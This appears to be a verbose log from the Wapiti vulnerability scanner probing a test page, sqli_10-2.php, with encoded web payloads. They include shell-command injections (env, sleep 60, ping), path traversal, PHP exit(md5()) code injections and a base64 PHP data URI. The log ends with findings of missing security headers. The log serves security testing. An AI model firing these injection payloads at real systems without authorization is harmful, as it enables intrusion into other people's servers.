2024-03-20 16:42:47.551 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_10-2.php?title=sqli_10-2.php%3A%3A%24DATA (0)
2024-03-20 16:42:47.578 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module exec
2024-03-20 16:42:47.593 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/sqli_10-2.php?title=fuzz (0)
2024-03-20 16:42:47.597 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_10-2.php?title=%3Benv%3B (0)
2024-03-20 16:42:47.606 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_10-2.php?title=%7Cenv%7C (0)
2024-03-20 16:42:47.615 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_10-2.php?title=a%3Benv%3B (0)
2024-03-20 16:42:47.623 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_10-2.php?title=a%3Benv%3B (0)
2024-03-20 16:42:47.632 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_10-2.php?title=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fusr%2Fbin%2Fenv%7C (0)
2024-03-20 16:42:47.642 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_10-2.php?title=fuzz%3Benv%3B (0)
2024-03-20 16:42:47.651 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_10-2.php?title=fuzz%0Aenv%3B (0)
2024-03-20 16:42:47.663 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_10-2.php?title=%26set%26 (0)
2024-03-20 16:42:47.674 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_10-2.php?title=set (0)
2024-03-20 16:42:47.681 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_10-2.php?title=env (0)
2024-03-20 16:42:47.691 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_10-2.php?title=%2Fe%00 (0)
2024-03-20 16:42:47.700 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_10-2.php?title=a%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F (0)
2024-03-20 16:42:47.709 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_10-2.php?title=a%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23 (0)
2024-03-20 16:42:47.716 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_10-2.php?title=%22%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F (0)
2024-03-20 16:42:47.726 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_10-2.php?title=%22%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23 (0)
2024-03-20 16:42:47.735 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_10-2.php?title=%27%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F (0)
2024-03-20 16:42:47.745 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_10-2.php?title=%27%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23 (0)
2024-03-20 16:42:47.754 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_10-2.php?title=%22.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F (0)
2024-03-20 16:42:47.763 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_10-2.php?title=%22.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%23 (0)
2024-03-20 16:42:47.773 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_10-2.php?title=%27.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F (0)
2024-03-20 16:42:47.782 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_10-2.php?title=%27.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%23 (0)
2024-03-20 16:42:47.792 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_10-2.php?title=%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F (0)
2024-03-20 16:42:47.801 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_10-2.php?title=%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23 (0)
2024-03-20 16:42:47.810 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_10-2.php?title=data%3A%3Bbase64%2CPD9waHAgZWNobyAndzRwMXQxJywnX2V2YWwnOyA%2FPg%3D%3D (0)
2024-03-20 16:42:47.821 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_10-2.php?title=a%60%29%60 (0)
2024-03-20 16:42:47.829 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_10-2.php?title=a%60sleep%2060%60 (0)
2024-03-20 16:42:47.839 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_10-2.php?title=a%3Bsleep%2060%3B (0)
2024-03-20 16:42:47.849 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_10-2.php?title=a%7Csleep%2060%3B (0)
2024-03-20 16:42:47.858 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_10-2.php?title=%26ping%20-n%2025%20127.0.0.1%26 (0)
2024-03-20 16:42:47.892 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module http_headers
2024-03-20 16:42:47.905 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/sqli_10-2.php?title=fuzz (0)
2024-03-20 16:42:47.914 | BLUE     | wapitiCore.attack.mod_http_headers:check_header:83 - Checking X-Frame-Options:
2024-03-20 16:42:47.915 | RED      | wapitiCore.attack.mod_http_headers:check_header:85 - X-Frame-Options is not set
2024-03-20 16:42:47.969 | BLUE     | wapitiCore.attack.mod_http_headers:check_header:83 - Checking X-Content-Type-Options:
2024-03-20 16:42:47.969 | RED      | wapitiCore.attack.mod_http_headers:check_header:85 - X-Content-Type-Options is not set
2024-03-20 16:42:48.040 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module xss
2024-03-20 16:42:48.051 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/sqli_10-2.php?title=fuzz (0)
2024-03-20 16:42:48.075 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module permanentxss
2024-03-20 16:42:48.148 | GREEN    | wapitiCore.controller.wapiti:write_report:601 - [*] Generating report...
2024-03-20 16:42:48.173 | SUCCESS  | wapitiCore.controller.wapiti:write_report:603 - A report has been generated in the file ./data/output//sqli_ajax.json/
2024-03-20 16:42:48.173 | SUCCESS  | wapitiCore.controller.wapiti:write_report:605 - Open ./data/output//sqli_ajax.json/web_03202024_1642.html with a browser to see this report.
